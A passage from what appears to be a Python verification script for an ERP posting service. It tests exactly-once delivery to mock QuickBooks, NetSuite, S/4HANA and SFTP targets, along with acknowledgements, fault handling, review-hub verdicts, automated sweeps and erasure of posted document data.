            assert listed["total"] >= 2 and listed["counts_by_state"]["DELIVERED"] >= 2
            assert client.get(base + "/erp/postings", params={"q": "INV-47-0002"}).json()["total"] >= 1
            pid = res["VENDOR_BILL"]["posting_id"]
            detail = client.get(base + f"/erp/postings/{pid}").json()
            assert detail["posting"]["state"] == "DELIVERED" and detail["canonical"]["total"] == "118000.00"
            assert detail["attempts"][0]["kind"] == "RENDER" and detail["idempotency_key"]
            f = client.get(base + f"/erp/postings/{pid}/file")
            row = db.get(ErpPosting, uuid.UUID(pid))
            assert f.status_code == 200 and f.content == bytes(row.rendered) and f.headers["cache-control"] == "no-store"
            assert db.execute(sa.text("SELECT count(*) FROM audit_logs WHERE organization_id = :o AND action::text = 'EXPORTED'"),
                              {"o": org}).scalar_one() >= 1, "the download was not audited"
            assert client.post(base + f"/erp/postings/{pid}/accept", json={}).status_code == 409, "ACCEPT on a delivered posting"
            response = (b"<ENVELOPE><BODY><DATA><IMPORTRESULT><RESPONSE><CREATED>1</CREATED><ALTERED>0</ALTERED>"
                        b"<LASTVCHID>4711</LASTVCHID><ERRORS>0</ERRORS><EXCEPTIONS>0</EXCEPTIONS></RESPONSE>"
                        b"</IMPORTRESULT></DATA></BODY></ENVELOPE>")
            acked = client.post(base + f"/erp/postings/{pid}/acknowledge", json={"response_text": response.decode()})
            assert acked.status_code == 200 and acked.json()["posting"]["state"] == "DONE" and \
                acked.json()["posting"]["external_id"] == "4711", acked.text[:300]
            je_id = res["JOURNAL_ENTRY"]["posting_id"]
            refusedj = client.post(base + f"/erp/postings/{je_id}/acknowledge", json={"accepted": False, "reason": "ledger missing"}).json()
            assert refusedj["posting"]["state"] == "REJECTED" and failed_keys(db.get(ErpPosting, uuid.UUID(je_id)))
            cancelled = client.post(base + f"/erp/postings/{je_id}/cancel", json={"note": "posted by hand"}).json()
            assert cancelled["posting"]["state"] == "CANCELLED" and cancelled["review_note"] == "posted by hand"
            assert client.post(base + f"/erp/postings/{je_id}/retry", json={}).status_code == 409
            docp = client.get(base + f"/work-items/{s['docs']['po']}/postings").json()
            assert {x["object_kind"] for x in docp["items"]} == {"PURCHASE_ORDER"} and docp["total"] >= 1, docp
            assert client.get(f"/api/v1/workspaces/{ws2}/erp/targets").status_code == 404, "another workspace was readable"
            assert client.delete(base + f"/erp/targets/{t_.id}").status_code == 409, "a target with postings was deleted"
            disabled = client.patch(base + f"/erp/targets/{t_.id}", json={"status": "DISABLED"})
            assert disabled.status_code == 200 and disabled.json()["target"]["status"] == "DISABLED"
            case5, _ = approved_case(5)
            dis = client.post(base + "/erp/postings", json={**post_body, "source_id": str(case5)}).json()["results"][0]
            assert dis["error"] and "disabled" in dis["error"], dis
            client.patch(base + f"/erp/targets/{t_.id}", json={"status": "ACTIVE"})
            s.update(tally=tally_t, rest=rest_t)

        step("D5 HTTP: all 27 routes 402 without capability.erp_posting (denial audited, hub hides POSTING); with it "
             "targets (private and metadata URLs refused), credentials (encrypted, fingerprint only, never audited), "
             "mappings (templates refused, versions, default), lookups, outcomes, preview (posts nothing), post (twice "
             "= one), list, detail, file (audited), acknowledge by response file / refusal, cancel, workspace scoping", d5)

        # ------------------------------------------------------------------ D6 REST / OData presets against the mock
        def d6() -> None:
            erp.reset()
            case_id, _ = approved_case(6)
            out = {}
            for preset in v.JSON_PRESETS:
                auth = "OAUTH2_REFRESH_TOKEN" if preset == "QUICKBOOKS_ONLINE" else "BEARER"
                cfg = rest_config(erp, preset)
                if auth.startswith("OAUTH2"):
                    cfg["oauth"] = {"token_url": erp.base + "/oauth2/token"}
                cred = {"client_id": "c", "client_secret": "s", "refresh_token": "refresh-1"} if auth.startswith("OAUTH2") \
                    else {"token": "static-token"}
                t_ = target(f"mock {preset}", "JSON", "HTTP", preset, config=cfg, auth_mode=auth, credential=cred)
                supported = [k for k in PR.supported_objects("JSON", preset) if k != "PAYMENT_REFERENCE"] + \
                    (["PAYMENT_REFERENCE"] if "PAYMENT_REFERENCE" in PR.supported_objects("JSON", preset) else [])
                for kind in supported:   # the payment after its bill: it names the bill's id at the ERP
                    with at(T0):
                        p, _ = service.plan(db, target=t_, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                            object_kind=kind, origin="MANUAL", actor_user_id=user)
                    assert p.state == "PENDING", (preset, kind, p.state, p.last_error)
                    job = db.execute(sa.select(Job).where(Job.job_type == v.JOB_DELIVER,
                                                          Job.idempotency_key.like(f"erp:deliver:{p.id}:%"))).scalar_one_or_none()
                    assert job is not None, f"{preset}/{kind}: planning enqueued no delivery"
                    result = deliver(p)
                    db.refresh(p)
                    assert p.state == "DONE" and p.external_id, (preset, kind, p.state, p.last_error, result)
                    out[f"{preset}/{kind}"] = p.external_id
                    again = deliver(p)
                    assert again["delivered"] is False, f"{preset}/{kind}: a DONE posting was delivered again"
            netsuite = [r for r in erp.requests if r["method"] == "POST" and "/netsuite/" in r["path"]]
            assert netsuite and all(r["headers"].get("x-netsuite-idempotency-key") for r in netsuite), "no NetSuite idempotency key"
            qbo = [r for r in erp.requests if r["method"] == "POST" and r["path"].startswith("/v3/company/")]
            assert qbo and all("requestid=" in r["query"] for r in qbo), "no QBO requestid"
            s4_writes = [r for r in erp.requests if r["method"] == "POST" and r["path"].startswith("/sap/")]
            assert s4_writes and all(r["headers"].get("x-csrf-token") for r in s4_writes), "S/4HANA written without a CSRF token"
            bearer = [r for r in erp.requests if r["path"].startswith("/v3/company/")]
            assert all(r["headers"].get("authorization", "").startswith("Bearer access-") for r in bearer), "QBO not on the refreshed token"
            qbo_t = db.execute(sa.select(ErpTarget).where(ErpTarget.name == "mock QUICKBOOKS_ONLINE", ErpTarget.workspace_id == ws)).scalar_one()
            rotated = json.loads(decrypt_secret(qbo_t.credential_ciphertext))
            assert rotated["refresh_token"] != "refresh-1" and rotated["refresh_token"] in erp.refresh_tokens, \
                "the rotated refresh token was not stored (the next refresh would fail)"
            for coll in ("Bill", "vendorBill", "purchaseInvoices", "bills"):
                rows = erp.created(coll)
                if rows:
                    assert len(rows) == 1, f"{coll}: {len(rows)} created for one posting"
            s["rest_results"] = out

        step("D6 REST/OData presets (QuickBooks Online with OAuth refresh rotation, Zoho Books, Business Central, S/4HANA "
             "with CSRF, NetSuite with its idempotency header, generic REST and OData): every supported object "
             "planned, enqueued, delivered to the mock and DONE only on its acknowledgement; delivering again sends nothing", d6)

        # ------------------------------------------------------------------ D7 faults: exactly once, acknowledgement mismatches
        def d7() -> None:
            erp.reset()
            t_ = target("QBO faults", "JSON", "HTTP", "QUICKBOOKS_ONLINE", config=rest_config(erp, "QUICKBOOKS_ONLINE"),
                        auth_mode="BEARER", credential={"token": "static-token"}, max_attempts=3)
            outcomes = {}

            def one(fault: Optional[str], n: int, kind: str = "VENDOR_BILL") -> ErpPosting:
                case_id, _ = approved_case(n)
                with at(T0):
                    p, _ = service.plan(db, target=t_, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                        object_kind=kind, origin="MANUAL", actor_user_id=user)
                if fault:
                    erp.fault("POST /bill", fault)
                with at(T0):
                    deliver(p)
                db.refresh(p)
                return p

            # the target committed, then the connection dropped: the probe finds it -- no second bill
            p = one("reset_after", 71)
            bills = [b for b in erp.created("Bill") if b.get("DocNumber") == p.document_number]
            assert p.state == "DONE" and len(bills) == 1 and erp.count("POST", "/bill") == 1, (p.state, p.last_error, len(bills))
            kinds = [a.kind + ":" + a.outcome for a in db.execute(sa.select(ErpPostingAttempt).where(
                ErpPostingAttempt.posting_id == p.id).order_by(ErpPostingAttempt.seq)).scalars()]
            assert "SEND:UNCERTAIN" in kinds and "PROBE:FOUND" in kinds, kinds
            outcomes["reset after commit"] = kinds
            # the connection dropped before the target read it: retried later (backoff), then DONE, one bill
            p = one("reset_before", 72)
            assert p.state == "RETRYING" and p.next_attempt_at is not None and p.next_attempt_at > T0, (p.state, p.next_attempt_at)
            with at(T0 + timedelta(seconds=5)):
                assert deliver(p)["delivered"] is False, "a retry ran before its backoff"
            with at(p.next_attempt_at + timedelta(seconds=1)):
                deliver(p)
            db.refresh(p)
            assert p.state == "DONE" and len([b for b in erp.created("Bill") if b.get("DocNumber") == p.document_number]) == 1
            outcomes["reset before"] = p.state
            # 503 with Retry-After: RETRYING, not before Retry-After
            p = one("status_503", 73)
            assert p.state == "RETRYING" and (p.next_attempt_at - T0).total_seconds() >= 1
            # 400: REJECTED with the target's reason, in the hub, posting.failed exactly once
            p = one("status_400", 74)
            assert p.state == "REJECTED" and "inactive" in (p.last_error or ""), (p.state, p.last_error)
            assert failed_keys(p) == [f"{v.EVENT_POSTING_FAILED}:{p.id}:1"], failed_keys(p)
            item = projection.load_item(db, workspace_id=ws, kind="POSTING", item_id=p.id)
            assert item is not None and item.status == "OPEN" and item.review_reason == "POSTING_EXCEPTION", item
            s["rejected"] = p
            # the target acknowledged a different total: MISMATCH (never DONE), in the hub, posting.failed once
            p = one("mismatch", 75)
            assert p.state == "MISMATCH" and "total" in (p.last_error or ""), (p.state, p.last_error)
            assert failed_keys(p) == [f"{v.EVENT_POSTING_FAILED}:{p.id}:1"]
            assert projection.load_item(db, workspace_id=ws, kind="POSTING", item_id=p.id).status == "OPEN"
            s["mismatch"] = p
            # the target refuses a duplicate number: the probe finds OUR bill there -- DONE, not rejected
            case_dup, _ = approved_case(76)
            with at(T0):
                pd, _ = service.plan(db, target=t_, source_kind="PROCUREMENT_CASE", source_id=case_dup,
                                     object_kind="VENDOR_BILL", origin="MANUAL", actor_user_id=user)
                deliver(pd)
            db.refresh(pd)
            assert pd.state == "DONE"
            erp.idempotency.clear()   # the target forgot the request id: only its duplicate check remains
            with at(T0):
                pd.state, pd.acknowledged_at, pd.external_id = "PENDING", None, None
                db.flush()
                deliver(pd)
            db.refresh(pd)
            assert pd.state == "DONE" and len([b for b in erp.created("Bill") if b.get("DocNumber") == pd.document_number]) == 1, \
                (pd.state, pd.last_error)
            # retries exhausted: FAILED (hub, trigger), with the attempts counted
            case_x, _ = approved_case(77)
            with at(T0):
                px, _ = service.plan(db, target=t_, source_kind="PROCUREMENT_CASE", source_id=case_x,
                                     object_kind="VENDOR_BILL", origin="MANUAL", actor_user_id=user)
            moment = T0
            for _ in range(4):
                erp.fault("POST /bill", "status_503")
                with at(moment):
                    deliver(px)
                db.refresh(px)
                if px.state != "RETRYING":
                    break
                moment = px.next_attempt_at + timedelta(seconds=1)
            assert px.state == "FAILED" and px.attempts == 3 and "no success after 3" in (px.last_error or ""), (px.state, px.attempts, px.last_error)
            assert failed_keys(px) == [f"{v.EVENT_POSTING_FAILED}:{px.id}:1"]
            # a lease that expired mid-send: the next claim PROBES before any re-send
            case_l, _ = approved_case(78)
            with at(T0):
                pl, _ = service.plan(db, target=t_, source_kind="PROCUREMENT_CASE", source_id=case_l,
                                     object_kind="VENDOR_BILL", origin="MANUAL", actor_user_id=user)
            db.execute(sa.update(ErpPosting).where(ErpPosting.id == pl.id).values(
                state="SENDING", lease_token=uuid.uuid4(), lease_until=T0 - timedelta(minutes=1), attempts=1))
            db.expire_all()
            with at(T0):
                deliver(pl)
            db.refresh(pl)
            probes = [a.kind for a in db.execute(sa.select(ErpPostingAttempt).where(ErpPostingAttempt.posting_id == pl.id)
                                                 .order_by(ErpPostingAttempt.seq)).scalars()]
            last_send = max(i for i, k in enumerate(probes) if k == "SEND")
            assert pl.state == "DONE" and "PROBE" in probes and probes.index("PROBE") < last_send, (pl.state, probes)
            assert len([b for b in erp.created("Bill") if b.get("DocNumber") == pl.document_number]) == 1
            s["qbo_faults"] = t_
            s["fault_outcomes"] = outcomes

        step("D7 exactly once under faults: a reset after the target committed is resolved by a probe (one bill); a reset "
             "before, 503 + Retry-After and exhausted retries back off and fail cleanly; 400 is REJECTED and a different "
             "acknowledged total is a MISMATCH (both in the hub, posting.failed once); a duplicate refusal of our own bill "
             "is DONE; an expired lease probes before re-sending", d7)

        # ------------------------------------------------------------------ D8 SFTP: 997s, ack files, Tally, pinned host keys
        def d8() -> None:
            cfg = sftp_config(box)
            cred = {"username": box.USER, "password": box.PASSWORD}
            x12_t = target("EDI partner", "X12", "SFTP", config=cfg, ack_mode="X12_997", auth_mode="SSH_PASSWORD", credential=cred)
            case_id, _ = approved_case(81)
            box.ack = "997"
            with at(T0):
                p, _ = service.plan(db, target=x12_t, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                    object_kind="VENDOR_BILL", origin="MANUAL", actor_user_id=user)
                deliver(p)
            db.refresh(p)
            assert p.state == "DELIVERED" and p.remote_path == f"/inbound/{p.rendered_filename}", (p.state, p.last_error)
            assert box.files("/inbound") == [p.rendered_filename], box.files("/inbound")   # renamed from .part, atomically
            with at(T0 + timedelta(minutes=10)):
                summary = service.poll_acks(db, x12_t)
            db.refresh(p)
            assert p.state == "DONE" and summary["done"] == 1, (p.state, summary)
            box.ack = "997-reject"
            with at(T0):
                p2, _ = service.plan(db, target=x12_t, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                     object_kind="PURCHASE_ORDER", origin="MANUAL", actor_user_id=user)
                deliver(p2)
                service.poll_acks(db, x12_t)
            db.refresh(p2)
            assert p2.state == "REJECTED" and "rejected" in (p2.last_error or "").lower(), (p2.state, p2.last_error)
            assert p2.control_numbers["gs06"] != p.control_numbers["gs06"], "two interchanges share a control number"
            tally_t = target("Tally over SFTP", "TALLY", "SFTP", config=cfg, ack_mode="ACK_FILE", auth_mode="SSH_PASSWORD",
                             credential=cred)
            box.ack = "tally"
            with at(T0):
                p3, _ = service.plan(db, target=tally_t, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                     object_kind="VENDOR_BILL", origin="MANUAL", actor_user_id=user)
                deliver(p3)
                service.poll_acks(db, tally_t)
            db.refresh(p3)
            assert p3.state == "DONE" and p3.external_id == "77", (p3.state, p3.external_id, p3.last_error)
            ubl_t = target("UBL drop", "UBL", "SFTP", config=cfg, ack_mode="DELIVERY", auth_mode="SSH_PASSWORD", credential=cred)
            box.ack = None
            with at(T0):
                p4, _ = service.plan(db, target=ubl_t, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                     object_kind="VENDOR_BILL", origin="MANUAL", actor_user_id=user)
                deliver(p4)
            db.refresh(p4)
            assert p4.state == "DONE" and p4.ack.get("via") == "delivery", (p4.state, p4.ack)
            # an importer takes the file at once and the rename's answer is lost: UNCERTAIN, never re-sent blind
            box.importer, box.fail_rename_after = True, True
            csv_t = target("CSV drop", "CSV", "SFTP", config=cfg, ack_mode="ACK_FILE", auth_mode="SSH_PASSWORD", credential=cred)
            with at(T0):
                p5, _ = service.plan(db, target=csv_t, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                     object_kind="JOURNAL_ENTRY", origin="MANUAL", actor_user_id=user)
                deliver(p5)
            db.refresh(p5)
            box.importer, box.fail_rename_after = False, False
            assert p5.state == "UNCERTAIN" and failed_keys(p5), (p5.state, p5.last_error)
            s["uncertain"] = p5
            # a server whose host key is not the pinned one: FAILED, nothing uploaded
            wrong = json.loads(json.dumps(cfg))
            wrong["sftp"]["host_key_sha256"] = "SHA256:" + "A" * 43
            evil_t = target("impostor", "CSV", "SFTP", config=wrong, ack_mode="ACK_FILE", auth_mode="SSH_PASSWORD", credential=cred)
            uploads = len(box.uploads)
            with at(T0):
                p6, _ = service.plan(db, target=evil_t, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                     object_kind="VENDOR_BILL", origin="MANUAL", actor_user_id=user)
                deliver(p6)
            db.refresh(p6)
            assert p6.state == "FAILED" and "host key" in (p6.last_error or "").lower() and len(box.uploads) == uploads, \
                (p6.state, p6.last_error)
            # no acknowledgement in time: FAILED by the poll
            box.ack = None
            silent = target("silent partner", "X12", "SFTP", config=cfg, ack_mode="X12_997", auth_mode="SSH_PASSWORD",
                            credential=cred, ack_timeout_hours=1)
            with at(T0):
                p7, _ = service.plan(db, target=silent, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                     object_kind="GOODS_RECEIPT", origin="MANUAL", actor_user_id=user)
                deliver(p7)
            with at(T0 + timedelta(hours=2)):
                service.poll_acks(db, silent)
            db.refresh(p7)
            assert p7.state == "FAILED" and "within 1 hours" in (p7.last_error or ""), (p7.state, p7.last_error)

        step("D8 SFTP (pinned host key): an X12 810 uploaded atomically and DONE on its 997, a 997 rejection REJECTED, "
             "control numbers never reused, Tally's import response read (voucher id), UBL delivery-level DONE, an "
             "importer that took the file with the answer lost is UNCERTAIN (never re-sent blind), an impostor host key "
             "FAILED with nothing uploaded, silence past the ack timeout FAILED", d8)

        # ------------------------------------------------------------------ D9 the review hub
        def d9() -> None:
            rejected, mismatch, uncertain = s["rejected"], s["mismatch"], s["uncertain"]
            erp.reset()
            # RETRY from the hub: the rejected bill (the cause fixed at the ERP) goes again and is DONE
            item = projection.load_item(db, workspace_id=ws, kind="POSTING", item_id=rejected.id)
            with at(T0 + timedelta(hours=1)):
                resolution.resolve_item(db, item=item, actor_user_id=user,
                                        payload=resolution.ResolvePayload(posting_verdict="RETRY", note="account re-activated"))
            db.refresh(rejected)
            assert rejected.state == "PENDING" and rejected.review_note == "account re-activated"
            with at(T0 + timedelta(hours=1)):
                deliver(rejected)
            db.refresh(rejected)
            assert rejected.state == "DONE", (rejected.state, rejected.last_error)
            assert projection.load_item(db, workspace_id=ws, kind="POSTING", item_id=rejected.id).status == "RESOLVED"
            # ACCEPT a mismatch with the ERP's reference: DONE without sending again
            posts = erp.count("POST", "/bill")
            item = projection.load_item(db, workspace_id=ws, kind="POSTING", item_id=mismatch.id)
            resolution.resolve_item(db, item=item, actor_user_id=user,
                                    payload=resolution.ResolvePayload(posting_verdict="ACCEPT", posting_reference="BILL-9001"))
            db.refresh(mismatch)
            assert mismatch.state == "DONE" and mismatch.external_id == "BILL-9001" and erp.count("POST", "/bill") == posts
            # CANCEL the uncertain one through the bulk API
            bulk = client.post(base + "/review/bulk", json={"action": "resolve", "kind": "POSTING", "ids": [str(uncertain.id)],
                                                             "idempotency_key": uuid.uuid4().hex,
                                                             "payload": {"posting_verdict": "CANCEL"}})
            assert bulk.status_code == 200 and bulk.json()["ok"] == 1, bulk.text[:300]
            db.refresh(uncertain)
            assert uncertain.state == "CANCELLED"
            # a verdict the state does not allow is refused (nothing changes)
            item = projection.load_item(db, workspace_id=ws, kind="POSTING", item_id=mismatch.id)
            err = _raises(lambda: resolution.resolve_item(db, item=item, actor_user_id=user,
                                                          payload=resolution.ResolvePayload(posting_verdict="RETRY")))
            assert err is not None and mismatch.state == "DONE", "a DONE posting was re-sent from the hub"
            queue = client.get(base + "/review/queue", params={"kind": "POSTING", "status": "OPEN"})
            if queue.status_code == 200:
                ids = {i["item_id"] for i in queue.json()["items"]}
                assert str(rejected.id) not in ids and str(uncertain.id) not in ids

        step("D9 review hub: a POSTING item per exception; RETRY re-sends (DONE), ACCEPT records the ERP's reference "
             "without sending, bulk CANCEL closes; a verdict the state does not allow is refused", d9)

        # ------------------------------------------------------------------ D10 Flow Builder: erp.post
        def d10() -> None:
            t_ = target("Flow CSV", "CSV", "DOWNLOAD")
            case_id, docs = approved_case(101)
            cfg = {"target_id": str(t_.id), "object_kinds": ["VENDOR_BILL", "PURCHASE_ORDER"]}
            ctx_ok = action_base.SaveContext(db=db, organization_id=org, workspace_id=ws, trigger_keys=("procurement.approved",))
            config = erp_post.DEFINITION.config_model.model_validate(cfg)
            assert erp_post._validate(ctx_ok, config) == {}
            wrong = action_base.SaveContext(db=db, organization_id=org, workspace_id=ws, trigger_keys=("document.completed",))
            assert "target_id" in erp_post._validate(wrong, config), "erp.post accepted on a trigger with no approved outcome"
            other = action_base.SaveContext(db=db, organization_id=org, workspace_id=ws2, trigger_keys=("procurement.approved",))
            assert "target_id" in erp_post._validate(other, config), "erp.post may name another workspace's target"
            ubl = target("Flow UBL", "UBL", "DOWNLOAD")
            bad = erp_post.DEFINITION.config_model.model_validate({"target_id": str(ubl.id), "object_kinds": ["JOURNAL_ENTRY"]})
            assert "object_kinds" in erp_post._validate(ctx_ok, bad)
            assert _raises(lambda: erp_post.DEFINITION.config_model.model_validate({**cfg, "amount": "999"})), \
                "erp.post took a document-derived parameter"
            event = SimpleNamespace(event_type="trigger.procurement.approved", payload={"case_id": str(case_id)})
            state = SimpleNamespace(db=db, execution=SimpleNamespace(organization_id=org, workspace_id=ws), trigger_event=event)
            spec = SimpleNamespace(action_type="erp.post", config=cfg, parameter_dict=lambda: cfg)
            outs = []
            for _ in range(3):   # the rule fires three times: two postings, once
                with at(T0):
                    outs.append(erp_post.perform(state, spec))
            assert outs[0].summary.startswith("2 posting(s) planned, 0 already") and \
                all(o.summary.startswith("0 posting(s) planned, 2 already") for o in outs[1:]), [o.summary for o in outs]
            assert len(postings_of(t_)) == 2 and all(p.origin == "FLOW" for p in postings_of(t_))
            held["value"] = False
            try:
                err = _raises(lambda: erp_post.perform(state, spec))
                assert err is not None and "not included" in str(err), err
            finally:
                held["value"] = True
            posting_failed = [e for e in emitted if e[0] == v.EVENT_POSTING_FAILED]
            assert posting_failed and all(set(p_) >= {"posting_id", "target", "object_kind", "state", "reason"}
                                          for _, _, p_ in posting_failed), "posting.failed without its fields"

        step("D10 Flow Builder: erp.post validates its trigger, its workspace's target and the objects the target takes; "
             "refuses document-derived parameters; three firings plan two postings once; refused without the plan; "
             "posting.failed carries its catalogue fields", d10)

        # ------------------------------------------------------------------ D11 the sweep
        def d11() -> None:
            since = T0 + timedelta(days=1)
            with at(since):
                auto = target("Auto CSV", "CSV", "DOWNLOAD", auto_post=True, auto_sources=["PROCUREMENT_CASE"],
                              auto_objects=["VENDOR_BILL"])
            old, _ = approved_case(111, resolved=since - timedelta(hours=1))
            new, _ = approved_case(112, resolved=since + timedelta(hours=1))
            with at(since + timedelta(hours=2)):
                first = service.sweep(db)
                second = service.sweep(db)
            mine = postings_of(auto)
            assert [(p.source_id, p.object_kind, p.origin) for p in mine] == [(new, "VENDOR_BILL", "AUTO")], \
                [(p.source_id, p.object_kind) for p in mine]
            assert first.planned >= 1 and second.planned == 0 and second.already >= 1, (first.as_json(), second.as_json())
            assert old not in {p.source_id for p in mine}, "auto-post reached back before it was switched on"
            # an expired lease is reclaimed (enqueued; the claim will probe)
            p = s["bill"]
            stuck, _ = approved_case(113)
            t_ = s["qbo_faults"]
            with at(T0):
                q, _ = service.plan(db, target=t_, source_kind="PROCUREMENT_CASE", source_id=stuck, object_kind="VENDOR_BILL",
                                    origin="MANUAL", actor_user_id=user)
            db.execute(sa.update(ErpPosting).where(ErpPosting.id == q.id).values(
                state="SENDING", lease_token=uuid.uuid4(), lease_until=T0 + timedelta(minutes=1), attempts=1))
            db.expire_all()
            with at(T0 + timedelta(minutes=30)):
                report = service.sweep(db)
            assert report.reclaimed >= 1, report.as_json()
            assert db.execute(sa.select(sa.func.count()).select_from(Job).where(
                Job.idempotency_key.like(f"erp:deliver:{q.id}:%"))).scalar_one() >= 2, "the reclaimed posting was not enqueued"
            # a download nobody confirms times out into the hub
            with at(T0 + timedelta(hours=73)):
                service.sweep(db)
            db.refresh(p)
            assert p.state in ("FAILED", "DONE"), p.state
            # the script: a dry run changes nothing
            with at(since + timedelta(hours=3)):
                db.commit()
                dry = sweeper.sweep(db, apply=False)
            assert dry["applied"] is False
            held["value"] = False
            try:
                with at(since + timedelta(hours=3)):
                    quiet_run = service.sweep(db)
                assert quiet_run.workspaces == 0 and quiet_run.skipped_without_plan >= 1, quiet_run.as_json()
            finally:
                held["value"] = True

        step("D11 sweep: auto-post plans only outcomes approved after it was switched on (again: nothing new), reclaims "
             "an expired lease, times out an unconfirmed download; a dry run commits nothing; skipped without the plan", d11)

        # ------------------------------------------------------------------ D12 the plan, at the worker
        def d12w() -> None:
            t_ = target("Worker REST", "JSON", "HTTP", "GENERIC_REST", config=rest_config(erp, "GENERIC_REST"),
                        auth_mode="BEARER", credential={"token": "static-token"})
            case_id, _ = approved_case(131)
            with at(T0):
                p, _ = service.plan(db, target=t_, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                    object_kind="VENDOR_BILL", origin="MANUAL", actor_user_id=user)
            db.commit()
            held["value"] = False
            try:
                out = job_handlers._HANDLERS[v.JOB_DELIVER]({"posting_id": str(p.id)})
            finally:
                held["value"] = True
            db.refresh(p)
            assert out["delivered"] is False and "capability" in out["reason"] and p.state == "PENDING", (out, p.state)
            with at(T0):
                out = job_handlers._HANDLERS[v.JOB_DELIVER]({"posting_id": str(p.id)})
            db.expire_all()
            assert out.get("state") == "DONE" and db.get(ErpPosting, p.id).state == "DONE", out
            assert job_handlers._HANDLERS[v.JOB_DELIVER]({"posting_id": str(uuid.uuid4())})["delivered"] is False

        step("D12 the worker: without capability.erp_posting the job sends nothing; with it the posting is delivered "
             "and DONE; a vanished posting is a no-op", d12w)

        # ------------------------------------------------------------------ D13 ARCH-20 erasure
        def d13e() -> None:
            t_ = target("Erasure CSV", "CSV", "DOWNLOAD")
            rest = target("Erasure REST", "JSON", "HTTP", "GENERIC_REST", config=rest_config(erp, "GENERIC_REST"),
                          auth_mode="BEARER", credential={"token": "static-token"})
            case_id, docs = approved_case(121)
            with at(T0):
                delivered, _ = service.plan(db, target=t_, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                            object_kind="VENDOR_BILL", origin="MANUAL", actor_user_id=user)
                queued, _ = service.plan(db, target=rest, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                         object_kind="VENDOR_BILL", origin="MANUAL", actor_user_id=user)
            assert delivered.state == "DELIVERED" and queued.state == "PENDING"
            counts: dict[str, int] = {}
            erasure_service._destroy_documents(db, subject_id=user, workspace_ids=[ws], counts=counts)
            db.expire_all()
            d, q = db.get(ErpPosting, delivered.id), db.get(ErpPosting, queued.id)
            for p in (d, q):
                assert p is not None and p.erased_at is not None and p.rendered is None and p.canonical is None and \
                    p.mapped is None and p.document_number is None, "an erased posting still quotes the document"
            assert d.state == "DELIVERED" and q.state == "CANCELLED", (d.state, q.state)
            assert counts.get("erp_postings", 0) >= 2, counts
            details = db.execute(sa.select(ErpPostingAttempt.detail).where(ErpPostingAttempt.posting_id.in_([d.id, q.id]))).scalars().all()
            assert all(x == {} for x in details), "attempt details kept after erasure"
            err = _raises(lambda: service.review(db, posting=d, verdict="RETRY", actor_user_id=user), service.ErpError)
            assert err is None or err.code in ("NOT_IN_EXCEPTION", "ERASED"), err
            assert client.get(base + f"/erp/postings/{d.id}/file").status_code == 404

        step("D13 ARCH-20 erasure: postings built from a subject's documents lose every quoted value (file, canonical, "
             "mapped, number, attempt details); the ledger row stays; one not yet sent is cancelled", d13e)
    except _StopRun:
        pass
    finally:
        for target_, attr, value in reversed(originals):
            setattr(target_, attr, value)
        for q, level in zip(quiet, levels):
            q.setLevel(level)
        if "client" in s:
            s["client"].close()
        stack.close()
        db.close()
        outer.rollback()
        conn.close()
    return steps


def concurrency_gate(patches: Optional[list] = None) -> dict:
    """X1: exactly once with real concurrency. A dedicated organization is COMMITTED (separate connections cannot
    see a rolled-back transaction), then deleted. 16 workers plan the same object at once; 12 workers deliver the
    same posting at once; 8 deliver one whose first send's answer is lost -- one posting, one send, one record."""
    import sqlalchemy as sa
    from sqlalchemy.orm import Session

    from app.api import capability_gate
    from app.db.session import engine
    from app.models.erp import ErpPosting, ErpTarget
    from app.services import audit_service
    from app.services.erp import service
    from app.services.erp import synthetic as S

    from app.workers import handlers as job_handlers

    job_handlers.register_all()
    Seeder = _load_module("_v40_47x", BACKEND / "verify_arch40.py").Seeder
    org, user, ws, vendor = uuid.uuid4(), uuid.uuid4(), uuid.uuid4(), uuid.uuid4()
    saved = [(capability_gate, "has_capability", capability_gate.has_capability),
             (audit_service, "record_independently", audit_service.record_independently), (service, "_audit", service._audit)]
    capability_gate.has_capability = lambda *_a, **_k: True
    audit_service.record_independently = lambda **kw: None
    # audit_logs is append-only (ARCH-07): this organization is deleted afterwards, so it writes none. The audit
    # rows every posting writes are gated in the rolled-back transaction (D5).
    service._audit = lambda *a, **k: None
    for target_, attr, value in patches or []:
        saved.append((target_, attr, getattr(target_, attr)))
        setattr(target_, attr, value)
    report: dict[str, Any] = {}
    try:
        with mock_targets() as (erp, _box):
            with engine.begin() as conn:
                seed = Seeder(conn)
                seed.insert("organizations", id=org, name="arch47 concurrency", slug=f"arch47x-{org.hex[:8]}", status="ACTIVE")
                seed.insert("users", id=user, email=f"x-{org.hex[:8]}@arch47.test", is_active=True, is_superuser=False,
                            is_verified=True, timezone="UTC", locale="en")
                seed.insert("workspaces", id=ws, organization_id=org, workspace_name="x", slug=f"x-{org.hex[:6]}",
                            status="ACTIVE", timezone="UTC", language="en", currency="INR", date_format="DD/MM/YYYY")
                seed.insert("workspace_members", id=uuid.uuid4(), user_id=user, workspace_id=ws, role="ADMIN", status="ACTIVE")
                cases = []
                for n in range(3):
                    docs = {}
                    for role, fields in (("invoice", {"invoice_number": f"INV-X-{n}", "invoice_date": "01/09/2026",
                                                      "vendor_name": "Concurrent Supplies Ltd", "total_amount": "118.00",
                                                      "tax_amount": "18.00", "currency": "INR"}),
                                         ("po", {"po_number": f"PO-X-{n}", "po_date": "20/08/2026",
                                                 "vendor_name": "Concurrent Supplies Ltd", "total_amount": "118.00"})):
                        docs[role] = uuid.uuid4()
                        seed.insert("work_items", id=docs[role], workspace_id=ws, original_filename=f"{role}-{n}.pdf",
                                    stored_filename=f"arch47x/{docs[role]}.pdf", file_type=PDF, file_size=10, page_count=1,
                                    extracted_entities=json.dumps(fields), extracted_text=role, created_by_user_id=user,
                                    pipeline_stage="COMPLETED")
                    case = seed.insert("procurement_cases", id=uuid.uuid4(), organization_id=org, workspace_id=ws,
                                       po_work_item_id=docs["po"], invoice_work_item_id=docs["invoice"], status="APPROVED",
